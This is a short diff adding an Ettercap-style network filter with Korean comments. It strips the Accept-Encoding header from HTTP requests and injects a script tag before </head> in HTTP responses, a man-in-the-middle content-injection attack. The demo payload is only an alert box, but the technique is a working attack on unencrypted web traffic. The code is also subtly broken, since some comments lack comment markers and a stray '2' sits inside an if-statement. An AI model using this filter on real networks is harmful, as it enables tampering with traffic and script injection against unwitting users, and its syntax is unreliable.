@@ -1,0 +1,14 @@
+if (ip.proto == TCP && tcp.dst == 80) {                        // 포트 80이 목적인 TCP패킷
+   if (search(DATA.data, "Accept-Encoding")) {                 // search 함수를 이용하여 Accept-Encoding 확인
+      pcre_regex(DATA.data, "(Accept-Encoding:).*([\r\n])", "$1 identity$2"); Accept-Encoding 헤더와 일치하는 정규표현식 생성, identity로 교체
+	  
+      msg("=");
+   }
+}
+
+if (ip.proto == TCP && tcp.src == 80) {              /// src가 80포트인지 확인
+   if (pcre_regex(DATA.data, "<\/head>")){ 2         /// 페이지에 <head> 태그가 있다면 pcre_regex로 가까운 <head>를 찾음
+      pcre_regex(DATA.data, "(<\/head>)","<script>alert('Injected')</script>$1"); alert 후 삽입
+      msg("+");
+   }
+}
